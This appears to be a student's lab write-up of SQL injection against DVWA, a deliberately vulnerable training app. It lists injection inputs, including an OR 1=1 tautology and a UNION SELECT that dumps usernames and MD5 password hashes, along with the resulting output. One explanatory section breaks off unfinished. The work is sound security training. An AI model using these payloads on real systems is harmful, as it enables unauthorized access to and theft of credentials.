## Task 3 SQL Injection Demonstration – DVWA (Low Security)

**📌 Overview**
This project demonstrates how SQL Injection vulnerabilities appear in a deliberately insecure web application: **DVWA (Damn Vulnerable Web Application)**.
The project is educational - to understand how insecure input handling can lead to unauthorized data exposure.

DVWA is designed for cybersecurity training and provides a safe environment to study common web vulnerabilities without impacting real systems.

---

**🔧 Environment Setup**
- DVWA running on a local machine or virtual machine  
- Apache, MySQL, PHP configured  
- DVWA security level set to **Low**


**🎯 Objective**
The goal of this Task is to:
- Show how DVWA behaves when user input is not validated or sanitized
- Observe how SQL queries can be manipulated
- Understand the security implications of SQL Injection
- Capture the application's behavior when given unexpected input

This project includes **screenshots** and a **demo video** illustrating the vulnerability.

---

**🛑 Why SQL Injection Occurs**
At the Low Security level, DVWA constructs SQL queries by directly concatenating user input:

## Results:-

1) input:- 1
ID: 1
First name: admin
Surname: admin

2) 2" OR 1=1
(It returns ALL user records, not just the user with ID 2.)
ID: 2" OR 1=1
First name: Gordon
Surname: Brown

3) %' UNION SELECT NULL, CONCAT(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) FROM users #
(This qery returns the first name, last name,username and password)

ID: %' UNION SELECT NULL, CONCAT(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) FROM users #
First name: 
Surname: admin
admin
admin
5f4dcc3b5aa765d61d8327deb882cf99

ID: %' UNION SELECT NULL, CONCAT(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) FROM users #
First name: 
Surname: Gordon
Brown
gordonb
e99a18c428cb38d5f260853678922e03

ID: %' UNION SELECT NULL, CONCAT(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) FROM users #
First name: 
Surname: Hack
Me
1337
8d3533d75ae2c3966d7e0d4fcc69216b

ID: %' UNION SELECT NULL, CONCAT(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) FROM users #
First name: 
Surname: Pablo
Picasso
pablo
0d107d09f5bbe40cade3de5c71e9e9b7

ID: %' UNION SELECT NULL, CONCAT(first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) FROM users #
First name: 
Surname: Bob
Smith
smithy
5f4dcc3b5aa765d61d8327deb882cf99




